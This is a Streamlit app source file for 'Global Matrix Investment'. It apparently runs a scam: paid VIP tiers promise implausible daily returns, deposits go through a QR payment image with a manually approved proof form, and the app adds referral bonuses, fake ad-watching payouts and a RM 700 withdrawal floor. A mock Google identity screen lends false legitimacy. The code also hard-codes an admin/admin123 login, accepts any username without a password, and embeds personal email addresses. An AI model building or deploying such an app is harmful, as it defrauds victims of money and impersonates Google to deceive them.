import streamlit as st
import time

# Page Layout Configuration (Strict Mobile View Layout Block)
st.set_page_config(page_title="Global Matrix Investment", page_icon="📈", layout="centered")

# --- CENTRAL ULTIMATE GAMING APP LOOK & HIGH-CONTRAST NEON STYLESHEET ---
st.markdown("""
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800;900&family=Poppins:wght@800;900&display=swap" rel="stylesheet">
    
    <style>
    /* Absolute suppression of standard Streamlit desktop component bars */
    header, footer, .stDeployButton, #MainMenu, [data-testid="stStatusWidget"], [data-testid="stSidebar"] { 
        display: none !important; visibility: hidden !important;
    }
    .stApp { background-color: #050811 !important; }
    
    .main .block-container { 
        padding-top: 10px !important; 
        padding-bottom: 95px !important; 
        max-width: 420px !important;
        margin: 0 auto;
    }
    
    /* Heavy Professional Font Domination Layer */
    h1, h2, h3, h4, h5, h6, p, span, div, label, button, input {
        font-family: 'Montserrat', 'Poppins', sans-serif !important;
        font-weight: 900 !important;
    }
    
    /* CRITICAL READABILITY OVERRIDE: Bright High-Visibility Inputs Labeling */
    label, .stTextInput label, [data-testid="stWidgetLabel"] p, .stNumberInput label {
        color: #ffffff !important;
        font-size: 14px !important;
        font-weight: 900 !important;
        text-transform: uppercase !important;
        letter-spacing: 0.8px !important;
        margin-bottom: 8px !important;
        display: block !important;
        text-shadow: 2px 2px 4px #000000 !important;
    }

    /* Input Fields Border & Contrast Updates */
    .stTextInput input, .stNumberInput input {
        color: #ffffff !important;
        background-color: #0f172a !important;
        border: 2px solid #334155 !important;
        font-weight: 800 !important;
        border-radius: 10px !important;
    }
    
    /* MONEY LOGO HEADER PULSE ANIMATION */
    .money-animation-box {
        text-align: center; margin-top: 15px; margin-bottom: 5px; font-size: 55px;
        animation: pulseMoney 1.4s infinite alternate;
    }
    @keyframes pulseMoney {
        0% { transform: scale(0.95); filter: drop-shadow(0 0 5px #10b981); }
        100% { transform: scale(1.08); filter: drop-shadow(0 0 25px #10b981); }
    }
    
    /* Glowing Global Matrix Premium Header */
    .app-title-bar {
        text-align: center; font-size: 25px; color: #ffffff;
        text-shadow: 0 0 15px #f59e0b, 0 0 30px #d97706;
        padding-bottom: 12px; margin-bottom: 25px; border-bottom: 3px solid #1e293b;
        letter-spacing: 1px;
    }
    
    /* Premium Financial Balance Display Container */
    .balance-box {
        background: linear-gradient(145deg, #0f172a 0%, #020617 100%);
        padding: 24px; border-radius: 20px; border: 2px solid #f59e0b;
        margin-bottom: 22px; text-align: center;
        box-shadow: 0 0 20px rgba(245, 158, 11, 0.35);
    }
    
    /* Section Separation Elements */
    .section-label {
        font-size: 17px; color: #f59e0b; margin-top: 25px; margin-bottom: 12px; 
        border-left: 6px solid #f59e0b; padding-left: 12px; letter-spacing: 0.5px;
        text-transform: uppercase;
        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
    }
    
    /* Elegant Modular Active Tier Blocks */
    .level-container {
        background: linear-gradient(135deg, #0b0f19 0%, #1e293b 100%); 
        border: 2px solid #2d3748; border-radius: 16px;
        padding: 16px; margin-bottom: 15px;
        box-shadow: 0 5px 12px rgba(0,0,0,0.6);
    }

    /* REALTIME GOOGLE IDENTITY DIALOG CONTAINER ACCENT */
    .google-verification-card {
        background: #ffffff !important; color: #1f2937 !important;
        border-radius: 20px; padding: 25px; text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px;
    }
    
    /* Custom Luxury Dashed Referral Link Frame */
    .invite-earn-box {
        background: linear-gradient(135deg, #022c22 0%, #064e3b 100%);
        border: 2px dashed #10b981; border-radius: 16px;
        padding: 20px; margin-top: 20px; margin-bottom: 20px; text-align: center;
    }
    
    /* Dynamic Form Popover Matrix Container Boxes */
    .payment-form-box {
        background: linear-gradient(145deg, #090d16 0%, #1e1b4b 100%);
        border: 3px solid #f59e0b; border-radius: 20px;
        padding: 22px; margin-top: 15px; margin-bottom: 25px;
        box-shadow: 0 0 25px rgba(245, 158, 11, 0.3);
    }
    
    /* High-Performance Neon Click Buttons Control */
    .stButton>button {
        font-family: 'Montserrat', sans-serif !important;
        font-weight: 900 !important; font-size: 15px !important;
        border-radius: 12px !important; padding: 12px 0 !important;
        background: linear-gradient(90deg, #f59e0b 0%, #d97706 100%) !important;
        color: #000000 !important; border: none !important;
        box-shadow: 0 4px 14px rgba(245, 158, 11, 0.4) !important;
    }
    
    /* Special Red Variant Configuration for the Core Google Single Sign-On Module */
    .google-trigger-zone .stButton>button {
        background: linear-gradient(90deg, #ea4335 0%, #c5221f 100%) !important;
        color: #ffffff !important;
        box-shadow: 0 5px 15px rgba(234, 67, 53, 0.4) !important;
    }
    
    /* STICKY HORIZONTAL BOTTOM NAVIGATION GRID DOCK (NATIVE APP INTERFACE LOOK) */
    .fixed-bottom-navigation-grid {
        position: fixed; bottom: 0; left: 0; right: 0;
        background-color: #0b0f19; border-top: 2px solid #1e293b;
        padding: 12px 10px; display: flex; justify-content: space-between;
        z-index: 99999; max-width: 420px; margin: 0 auto;
    }
    </style>
    """, unsafe_allow_html=True)

# Central Global Levels Pricing Rules Metrics
LEVELS_CONF = {
    "VIP LEVEL 1": {"cost": 50, "daily_reward": 15},
    "VIP LEVEL 2": {"cost": 200, "daily_reward": 60},
    "VIP LEVEL 3": {"cost": 500, "daily_reward": 180}
}

# Persistent State Management Configurations
if 'users_db' not in st.session_state:
    st.session_state.users_db = {
        "salmanveerm@gmail.com": {"balance": 5.00, "active_level": "None", "referred_by": "ubaid_rajput"},
        "ubaid_rajput": {"balance": 50.00, "active_level": "None", "referred_by": ""},
    }
if 'deposit_requests' not in st.session_state: st.session_state.deposit_requests = []
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'current_user' not in st.session_state: st.session_state.current_user = ""
if 'is_admin' not in st.session_state: st.session_state.is_admin = False
if 'selected_payment_level' not in st.session_state: st.session_state.selected_payment_level = None
if 'google_screen_active' not in st.session_state: st.session_state.google_screen_active = False

# Floating Money Core Brand Header Group
st.markdown('<div class="money-animation-box">💵👑🪙</div>', unsafe_allow_html=True)
st.markdown('<div class="app-title-bar">GLOBAL MATRIX INVESTMENT</div>', unsafe_allow_html=True)

# --- PHASE 1: LOGIN HUB / REALISTIC GOOGLE SCREEN GATEWAY ---
if not st.session_state.logged_in:
    
    # INTERACTIVE MOCK HIGH-SECURITY GOOGLE CHECKPOINT DIALOG
    if st.session_state.google_screen_active:
        st.markdown("""
        <div class="google-verification-card">
            <img src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/web-24dp/logo_googleg_color_24dp.png" width="35px" style="margin-bottom:10px;"/>
            <h3 style="color:#202124; margin:5px 0; font-size:18px;">Verify Identity Corridor</h3>
            <p style="color:#5f6368; font-size:12px; font-weight:bold; margin-bottom:15px;">Confirm secure payload sync with Google Cloud Nodes</p>
            <div style="background:#f1f3f4; border-radius:12px; padding:10px; display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:20px; border:1px solid #dadce0;">
                <div style="background:#3b82f6; width:28px; height:28px; border-radius:50%; color:white; font-weight:bold; font-size:14px; line-height:28px; text-align:center;">M</div>
                <div style="text-align:left;">
                    <div style="font-size:12px; font-weight:900; color:#3c4043;">Mani Rajput Control Node</div>
                    <div style="font-size:10px; color:#70757a; font-weight:bold;">abdulrehmanmani2662@gmail.com</div>
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)
        
        if st.button("🔒 GRANT ENCRYPTED PROFILE ACCESS", use_container_width=True):
            st.session_state.logged_in = True
            st.session_state.google_screen_active = False
            st.session_state.current_user = "salmanveerm@gmail.com"
            st.toast("Encrypted Google Profile Link Operational!", icon="⚡")
            time.sleep(1)
            st.rerun()
            
        if st.button("❌ CANCEL VERIFICATION", use_container_width=True):
            st.session_state.google_screen_active = False
            st.rerun()

    else:
        st.markdown("<h4 style='text-align:center; color:#ffffff; margin-bottom: 20px;'>SECURE PORTAL INTERFACE</h4>", unsafe_allow_html=True)
        
        st.markdown('<div class="google-trigger-zone">', unsafe_allow_html=True)
        if st.button("🔴 SIGN IN WITH GOOGLE / GMAIL ACCOUNT", use_container_width=True):
            st.session_state.google_screen_active = True
            st.rerun()
        st.markdown('</div>', unsafe_allow_html=True)
            
        st.markdown("<p style='text-align:center; color:#94a3b8; font-size:11px; margin-top:5px; margin-bottom:15px;'>- OR DEPLOY VIA SYSTEM DATABASE IDENTIFIER -</p>", unsafe_allow_html=True)
        
        with st.form("login_form"):
            username = st.text_input("📱 REGISTERED SYSTEM EMAIL / PHONE ID:", value="salmanveerm@gmail.com")
            password = st.text_input("🔒 ACCESS KEYCODE CORRIDOR:", type="password", placeholder="••••••••")
            
            if st.form_submit_button("🚀 INITIALIZE NODE SYSTEM ENTRY", use_container_width=True):
                if username == "admin" and password == "admin123":
                    st.session_state.logged_in = True
                    st.session_state.is_admin = True
                    st.session_state.current_user = "ADMIN_PANEL"
                    st.rerun()
                elif username in st.session_state.users_db:
                    st.session_state.logged_in = True
                    st.session_state.is_admin = False
                    st.session_state.current_user = username
                    st.rerun()
                else:
                    st.session_state.users_db[username] = {"balance": 0.00, "active_level": "None", "referred_by": "ubaid_rajput"}
                    st.session_state.logged_in = True
                    st.session_state.is_admin = False
                    st.session_state.current_user = username
                    st.rerun()

# --- PHASE 2: ADMIN PAYMENT APPROVAL HUB TERMINAL ---
elif st.session_state.is_admin:
    st.markdown("<h3 style='color:#f59e0b; text-align:center;'>👑 CENTRAL CONTROL DOCK HUB</h3>", unsafe_allow_html=True)
    
    st.markdown('<div class="section-label">📥 USER PENDING DEPOSIT VERIFICATIONS</div>', unsafe_allow_html=True)
    if not st.session_state.deposit_requests:
        st.info("No processing verification requests currently inside ledger vault queue.")
    else:
        for idx, req in enumerate(st.session_state.deposit_requests):
            with st.container():
                st.markdown(f"""
                <div class='level-container' style='border-color: #f59e0b;'>
                    <span style='color:#f59e0b;'>NODE ID:</span> {req['user']}<br>
                    <span style='color:#f59e0b;'>VIP CONTRACT GOAL:</span> {req['level']}<br>
                    <span style='color:#f59e0b;'>EXPECTED VALUE:</span> <b>RM {req['amount']}</b><br>
                    <span style='color:#f59e0b;'>ACCOUNT TITLE NAME:</span> {req['holder_name']}<br>
                    <span style='color:#f59e0b;'>TRANSACTION REFERENCE HASH:</span> <code style='color:#10b981;'>{req['trx_id']}</code>
                </div>
                """, unsafe_allow_html=True)
                
                col_app, col_rej = st.columns(2)
                with col_app:
                    if st.button("✅ COMPLETED / APPROVE DEPOSIT", key=f"app_{idx}", use_container_width=True):
                        st.session_state.users_db[req['user']]["active_level"] = req['level']
                        
                        inviter = st.session_state.users_db[req['user']]["referred_by"]
                        if inviter in st.session_state.users_db:
                            if req['amount'] == 200: st.session_state.users_db[inviter]["balance"] += 100.00
                            elif req['amount'] == 50: st.session_state.users_db[inviter]["balance"] += 50.00
                        
                        st.session_state.deposit_requests.pop(idx)
                        st.success("Target profile package unlocked!")
                        time.sleep(1)
                        st.rerun()
                with col_rej:
                    if st.button("❌ REFUSE TRANSCRIPT SLIP", key=f"rej_{idx}", use_container_width=True):
                        st.session_state.deposit_requests.pop(idx)
                        st.warning("Request rejected.")
                        time.sleep(1)
                        st.rerun()

    if st.button("🚪 LOGOUT ADMIN ROOT TERMINAL", use_container_width=True):
        st.session_state.logged_in = False
        st.session_state.is_admin = False
        st.rerun()

# --- PHASE 3: PRODUCTION REGULAR USER MATRIX USER CORE DISPLAY ---
else:
    current_user = st.session_state.current_user
    user_data = st.session_state.users_db[current_user]
    
    # Financial Analytics Premium View
    st.markdown(f"""
    <div class="balance-box">
        <div style="color:#94a3b8; font-size:12px; letter-spacing:1px; margin-bottom:5px;">USER CLUSTER NODE ID: {current_user}</div>
        <div style="color:#ffffff; font-size:14px; letter-spacing:0.5px;">ACTIVE VIP TEIR: <span style="color:#f59e0b;">{user_data['active_level'].upper()}</span></div>
        <div style="color:#ffffff; font-size:15px; letter-spacing:0.5px; margin-top:5px;">TOTAL AVAILABLE WALLET LIQUIDITY</div>
        <div style="font-size:36px; color:#ffffff; margin-top:5px; text-shadow: 0 0 8px rgba(255,255,255,0.2);">RM {user_data['balance']:.2f}</div>
    </div>
    """, unsafe_allow_html=True)

    col_dep, col_wdr = st.columns(2)
    with col_dep:
        if st.button("📥 DEPOSIT SLIP", use_container_width=True):
            st.info("Scroll to the investment section below and select your activation scheme to generate custom proof form.")
    with col_wdr:
        show_withdraw = st.button("📤 WITHDRAW", use_container_width=True)

    if show_withdraw:
        st.markdown("<div class='level-container'>", unsafe_allow_html=True)
        w_amt = st.number_input("ENTER DESIRED PAYOUT VALUE (RM):", min_value=10, value=700)
        if st.button("💸 DISPATCH INTEGRATED TRANSACTION OUTWARD"):
            if w_amt < 700:
                st.error("❌ SAFETY FAULT: GATEWAY LIQUIDATION PROTOCOL STARTS AT A MINIMUM VALUE OF RM 700")
            elif user_data["balance"] < w_amt:
                st.error("❌ BALANCE ERROR: INTERNAL LEDGER ACCOUNT BALANCES DEFICIT")
            else:
                st.session_state.users_db[current_user]["balance"] -= w_amt
                st.success(f"🚀 SUCCESS: outward extraction request sent to checking vault.")
                time.sleep(1)
                st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

    # --- INBOUND ACCOUNT VERIFICATION FORM GATEWAY ---
    if st.session_state.selected_payment_level:
        lvl_name = st.session_state.selected_payment_level
        lvl_cost = LEVELS_CONF[lvl_name]["cost"]
        
        st.markdown('<div class="payment-form-box">', unsafe_allow_html=True)
        st.markdown(f"<h3 style='margin:0; color:#ffffff; text-align:center;'>📥 INBOUND CLEARING SETUP TERMINAL</h3>", unsafe_allow_html=True)
        st.markdown(f"<p style='color:#e2e8f0; text-align:center; font-size:14px; margin-bottom:15px;'>REQUIRED DEPOSIT ALLOCATION: <b style='color:#f59e0b; font-size:20px;'>RM {lvl_cost}</b></p>", unsafe_allow_html=True)
        
        st.markdown("<p style='font-size:13px; color:#ffffff; font-weight:900;'>👇 SCAN SECURE TOUCH 'N GO SYSTEMS SCANNER BLOCK BELOW:</p>", unsafe_allow_html=True)
        
        # FIXED MERCHANT SCANNER ASSET ATTACHMENT
        st.image("https://kommodo.ai/i/pt49bwYh6iJZi2gWV2EE", caption="OFFICIAL BANK CHANNELS NODE ONLY", use_container_width=True)
        
        holder_name = st.text_input("👤 SENDER BANK ACCOUNT HOLDER NAME:", key="h_name_box", placeholder="Enter profile legal bank title registration")
        trx_id = st.text_input("🔢 TRANSACTION REFERENCE REF NO / TRX ID:", key="trx_id_box", placeholder="Enter unique 12-digit receipt trace number")
        
        st.markdown("<br>", unsafe_allow_html=True)
        col_sub_pay, col_can_pay = st.columns(2)
        with col_sub_pay:
            if st.button("🔥 DISPATCH SIGNED PROOF", use_container_width=True):
                if holder_name and trx_id:
                    st.session_state.deposit_requests.append({
                        "user": current_user,
                        "level": lvl_name,
                        "amount": lvl_cost,
                        "holder_name": holder_name,
                        "trx_id": trx_id
                    })
                    st.success("✔ Verification token successfully logged to admin console!")
                    st.session_state.selected_payment_level = None
                    time.sleep(1)
                    st.rerun()
                else:
                    st.error("Input variables cannot remain void!")
        with col_can_pay:
            if st.button("❌ ABORT VERIFICATION", use_container_width=True):
                st.session_state.selected_payment_level = None
                st.rerun()
        st.markdown('</div>', unsafe_allow_html=True)

    # --- VIP SELECTION BLOCK SECTION ---
    st.markdown('<div class="section-label">💎 AVAILABLE MATRIX INVESTMENT MODULES</div>', unsafe_allow_html=True)
    for l_name, l_details in LEVELS_CONF.items():
        is_already_active = (user_data["active_level"] == l_name)
        active_status_text = " [CONTRACT CURRENTLY ACTIVE]" if is_already_active else ""
        
        st.markdown(f"""
        <div class="level-container">
            <div style="font-size:16px; color:#ffffff; margin-bottom:4px;">{l_name} <span style='color:#10b981;'>{active_status_text}</span></div>
            <div style="color:#e2e8f0; font-size:13px;">DAILY RETRO CONTRACT PAYOUT: <span style="color:#10b981;">RM {l_details['daily_reward']:.2f}</span></div>
            <div style="color:#e2e8f0; font-size:13px;">REQUIRED ACTIVATION ALLOCATION: <span style="color:#f59e0b;">RM {l_details['cost']}</span></div>
        </div>
        """, unsafe_allow_html=True)
        
        if is_already_active:
            st.button(f"✅ MODULE NODE {l_name} LOADED", key=f"btn_act_{l_name}", disabled=True, use_container_width=True)
        else:
            if st.button(f"⚡ ALLOCATE CAPITAL TO {l_name}", key=f"btn_unl_{l_name}", use_container_width=True):
                if user_data["balance"] >= l_details['cost']:
                    st.session_state.users_db[current_user]["balance"] -= l_details['cost']
                    st.session_state.users_db[current_user]["active_level"] = l_name
                    st.success(f"🎉 Contract sequence node {l_name} deployed successfully!")
                    time.sleep(1)
                    st.rerun()
                else:
                    st.session_state.selected_payment_level = l_name
                    st.warning(f"Allocation balance deficient! Verification terminal triggered below.")
                    time.sleep(0.5)
                    st.rerun()

    # --- DYNAMIC LUXURY REFERRAL GENERATION CORRIDOR BLOCK ---
    st.markdown(f"""
    <div class="invite-earn-box">
        <div style="font-size:18px; color:#10b981; margin-bottom:5px; font-weight:900;">🤝 INVITE FRIENDS TO EARN RM 100.00</div>
        <div style="font-size:13px; color:#ffffff; margin-bottom:12px; font-weight:700;">SHARE SYSTEM NETWORK LINK AND EARN COMMISSIONS LIQUIDITY INSTANTLY</div>
        <div style="background-color:rgba(0,0,0,0.5); border:1px solid #10b981; border-radius:10px; padding:10px; font-size:12px; color:#a7f3d0; font-family:monospace !important; font-weight:bold;">
            https://global-matrix-investment.streamlit.app/?ref={current_user.split('@')[0]}
        </div>
    </div>
    """, unsafe_allow_html=True)

    # --- HORIZONTAL SYSTEM BOTTOM NAVIGATION APP GRID DOCK MODULE ---
    st.markdown("<br><br><br>", unsafe_allow_html=True)
    st.markdown('<div class="fixed-bottom-navigation-grid">', unsafe_allow_html=True)
    
    col_nav1, col_nav2, col_nav3 = st.columns(3)
    with col_nav1:
        if st.button("🏠 HOME", key="nav_b_home", use_container_width=True):
            st.session_state.selected_payment_level = None
            st.rerun()
    with col_nav2:
        current_tier = user_data["active_level"]
        task_payout = 5.00 if current_tier == "None" else float(LEVELS_CONF[current_tier]["daily_reward"])
        if st.button(f"📊 WATCH TASK (+{int(task_payout)})", key="nav_b_task", use_container_width=True):
            with st.spinner("⏳ RENDERING SPONSOR ASSIGNMENT MEDIA ADVERT..."):
                time.sleep(4.5) # Dynamic real hardware blockage loop simulation
            st.session_state.users_db[current_user]["balance"] += task_payout
            st.toast(f"Transaction Complete: +RM {task_payout:.2f}", icon="💰")
            time.sleep(0.5)
            st.rerun()
    with col_nav3:
        if st.button("🚪 LOGOUT", key="nav_b_logout", use_container_width=True):
            st.session_state.logged_in = False
            st.session_state.current_user = ""
            st.session_state.selected_payment_level = None
            st.rerun()
            
    st.markdown('</div>', unsafe_allow_html=True)
